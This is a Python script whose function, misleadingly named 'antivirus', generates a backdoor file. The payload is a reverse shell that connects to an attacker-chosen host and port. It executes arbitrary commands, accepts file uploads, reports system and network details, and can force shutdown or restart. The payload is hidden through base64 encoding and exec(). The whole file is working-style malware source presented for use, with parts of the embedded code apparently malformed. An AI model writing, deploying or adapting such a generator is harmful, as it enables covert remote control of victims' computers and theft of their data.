def antivirus(lport, lhost, filename):
    with open(filename, "x") as backdoor:
        import base64
        payload = (r"""
        try:
            import platform, re, uuid, psutil, logging
            import subprocess
            import socket
            import os
            def write_file(content, name):
                with open(name, "wb") as write:
                    write.write(content)
                connection.send("[+] Upload sucessful".encode())
            def execute_sys_command(command):
                op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
                output = op.stdout.read()
                output_error = op.stderr.read()
                data = output + output_error
                connection.send(data + "Done".encode())
    
    
            def change_dir(dir):
                os.chdir(dir)
                return "[+] Changing working directory to " + dir
    
            host = '{}'
            port = int({})
            connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            connection.connect((host, port))
            while True:
                recieved = connection.recv(1048576)
                command = recieved.decode()
                if "ChangeDir " in command:
                    directory = command.replace("ChangeDir ", "")
                    result = change_dir(dir=directory)
                    result = result.encode()
                    connection.send(result)
                elif command.startswith("Upload"):
                    name = command.split()[1]
                    content = connection.recv(1048576)
                    write_file(content=content, name=name)
                elif command == "Shutdown":
                    success = "[+] Target going to shutdown "
                    success = success.encode()
                    connection.send(success)
                    subprocess.call("shutdown /s /f", shell=True)
                elif command.startswith("mkdir"):
                    execute_sys_command(command=command)
                elif command == "Restart":
                    success = "[+] Target going to restart "
                    success = success.encode()
                    connection.send(success)
                    subprocess.call("shutdown /r /f", shell=True)
                elif command == "Exit.session":
                    closing = "[+] Session is going to close"
                    closing = closing.encode()
                    connection.send(closing)
                    connection.close()
                elif command == "SysInfo" or command == "Sysinfo" or command == "sysinfo" or command == "sysInfo":
                    def getSystemInfo():
                        try:
                            os = "Platform = " + platform.system()
                            release = ", Platform release = " + platform.release()
                            version = ", Platform version = " + platform.version()
                            archit = ", Architecture = " + platform.machine()
                            hostname = ", Hostname = " + socket.gethostname()
                            ip = ", Ip address = " + socket.gethostbyname(socket.gethostname())
                            mac = ", Mac address = " + ':'.join(re.findall('..', '%012x' % uuid.getnode()))
                            processor = ", Processor = " + platform.processor()
                            ram = ", Ram = " + str(round(psutil.virtual_memory().total / (1024.0 ** 3))) + " GB"
                            full = os + release + version + archit + hostname + ip + mac + processor + ram
                            full = full.encode()
                            connection.send(full)
    
                        except Exception as e:
                            logging.exception(e)
    
    
                    getSystemInfo()
                else:
                    execute_sys_command(command=command)
        except KeyboardInterrupt:
            print("KeyBoardInterrupt")
            quit()
        except ConnectionAbortedError:
            print("Connection was aborted")
            quit()
        except ConnectionRefusedError:
            print("Connection refused by target")
            quit()
    
    
            """.format(lhost, lport))
        payload_bytes = payload.encode('utf-8')
        base64_bytes = base64.b64encode(payload_bytes)
        base64_payload = base64_bytes.decode('utf-8')
        backdoor.write(r"""
        payload = '""" + base64_payload + """'""" + """ 
        exec(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')(payload)[0]))
        """)